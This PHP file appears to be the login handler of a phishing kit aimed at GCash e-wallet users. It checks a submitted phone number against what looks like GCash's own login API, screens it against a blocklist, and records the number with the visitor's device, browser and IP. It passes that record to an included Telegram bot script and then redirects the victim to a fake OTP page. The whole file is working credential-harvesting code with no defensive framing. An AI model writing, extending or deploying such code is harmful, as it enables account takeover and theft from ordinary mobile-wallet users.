<?php

function regular_expression($number){
    if(preg_match("/^(9)\d{9}$/", $number)){
        return true;
    } else{
        return false;
    }
}


if(isset($_POST['submitnum'])){
$number = $_POST['number'];

function gcash_num_check($number){
  $g_num = $number;
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "http://mgs-gw.paas.mynt.xyz/mgw.htm?ctoken=");
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'operationType=alipayplus.mobilewallet.user.login.consult&requestData=%5B%7B%22envInfo%22%3A%7B%22tokenId%22%3A%2276116844-0287-4ee8-9d2c-d7af66cc12de%22%2C%22osType%22%3A%22WindowsNT%22%2C%22osVersion%22%3A%2210.0%22%2C%22browserType%22%3A%22Chrome%22%2C%22browserVersion%22%3A%2293%22%2C%22terminalType%22%3A%22WEB%22%7D%2C%22loginIdType%22%3A%22MOBILE_NO%22%2C%22loginId%22%3A%220'.$g_num.'%22%2C%22extParams%22%3A%7B%22bizNo%22%3A%22%22%2C%22sessionId%22%3Anull%2C%22bizTypeForMonitor%22%3A%22ONLINE_LAZADA%22%2C%22merchantForMonitor%22%3A%22%22%7D%7D%5D&version=2.0&workspaceId=PROD&appId=D54528A131559&tenantId=MYNTPH');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $result = curl_exec($ch);
  curl_close($ch);
  $obj = json_decode($result);
  $status = $obj->{'result'}->{'success'};
  if( $status == true){
    return true;
  } else if($status == false){
    return false;
  }
}

if(gcash_num_check($number) == true){
function find_string_in_array($arr, $string) {
  return array_filter($arr, function($value) use ($string) {
  return strpos($value, $string) !== false;
});
}
  $file_blocklist = file_get_contents('config/blocklist.txt');
  $arr = explode("\n", $file_blocklist);
  $block_numlist = find_string_in_array($arr, $number);
  if (empty($block_numlist)){
    include('src/system.php');
    $num = $_POST['number'];
    $replyMsg = "```diff\n- LOGIN [$device_used|$browser_used|$ip]\n  $num```";
    $tgMsg = "LOGIN|$device_used|$browser_used|$ip\n - $num";
    include('_bot.php');
    $encodenum = base64_encode(base64_encode($num));
    header("Location:net/otp.php?otpclid=$encodenum");
  } 
else{
  header("Location:index.php?login-blocked");
}
} else{
  header("Location:index.php?login-gcash");
}
}
?>